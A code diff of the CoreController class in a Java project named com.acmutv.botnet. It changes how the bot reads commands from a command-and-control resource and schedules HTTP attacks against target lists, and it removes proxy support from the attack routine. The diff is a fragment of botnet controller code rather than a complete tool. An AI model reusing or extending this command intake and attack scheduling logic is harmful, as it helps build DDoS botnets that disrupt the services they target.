@@ -36,7 +36,6 @@ import com.acmutv.botnet.core.pool.BotPool;
 import com.acmutv.botnet.core.state.BotState;
 import com.acmutv.botnet.core.target.HttpTarget;
 import com.acmutv.botnet.tool.net.HttpMethod;
-import com.acmutv.botnet.tool.net.HttpProxy;
 import com.acmutv.botnet.tool.reflection.ReflectionManager;
 import com.acmutv.botnet.tool.runtime.RuntimeManager;
 import com.acmutv.botnet.tool.net.ConnectionManager;
@@ -141,16 +140,6 @@ public class CoreController {
     } catch (IOException exc) {
       throw new BotException("Cannot load bot configuration C&C. Cause: {}", exc.getMessage());
     }
-    /*
-    try (InputStream in = new FileInputStream(initResource)) {
-      LOGGER.info("Loading remote configuration...");
-      AppConfigurationService.loadJson(in);
-    } catch (FileNotFoundException exc) {
-      throw new BotException("Cannot connect to C&C at %s", initResource);
-    } catch (IOException exc) {
-      LOGGER.warn("Cannot close connection to C&C. Cause: {}", exc.getMessage());
-    }
-    */
     allocateResources();
     LOGGER.info("Bot is up and running");
     changeState(BotState.EXECUTION);
@@ -197,8 +186,7 @@ public class CoreController {
         final HttpMethod method = (HttpMethod) command.getParams().get("method");
         @SuppressWarnings("unchecked")
         final List<HttpTarget> targets = (List<HttpTarget>) command.getParams().get("targets");
-        final HttpProxy proxy = (HttpProxy) command.getParams().get("proxy");
-        executeHttpAttack(method, targets, proxy);
+        executeHttpAttack(method, targets);
         break;
 
       default:
@@ -235,22 +223,12 @@ public class CoreController {
     LOGGER.traceEntry();
     final String cmdResource = AppConfigurationService.getConfigurations().getCmdResource();
     LOGGER.info("Reading command from {}", cmdResource);
-    BotCommand cmd = null;
-    try {
-      cmd = BotCommandService.readFromJsonResource(cmdResource);
-    } catch (IOException exc) {
-      throw new BotException("Cannot read command");
-    }
-    /*
     BotCommand cmd;
-    try (InputStream in = new FileInputStream(cmdResource)) {
-      // cmd = BotCommandService.readFromJson(in);
-      cmd = BotCommandService.takeCommand(in);
+    try {
+      cmd = BotCommandService.consumeJsonResource(cmdResource);
     } catch (IOException exc) {
-      throw new BotException("Command resource unreachable. Cause: %s", exc.getMessage());
+      throw new BotException("Cannot consume command. Cause: " + exc.getMessage());
     }
-    */
-
     return LOGGER.traceExit(cmd);
   }
 
@@ -338,11 +316,11 @@ public class CoreController {
     LOGGER.traceExit();
   }
 
-  public static void executeHttpAttack(HttpMethod method, List<HttpTarget> targets, HttpProxy proxy) {
-    LOGGER.traceEntry("method={} targets={} proxy={}", method, targets, proxy);
+  public static void executeHttpAttack(HttpMethod method, List<HttpTarget> targets) {
+    LOGGER.traceEntry("method={} targets={} proxy={}", method, targets);
     LOGGER.info("Scheduling attack...");
     targets.stream().forEach(target -> {
-      HttpAttack attacker = new HttpAttack(method, target, proxy);
+      HttpAttack attacker = new HttpAttack(method, target);
       POOL.submit(attacker);
     });
     LOGGER.info("Attack scheduled");
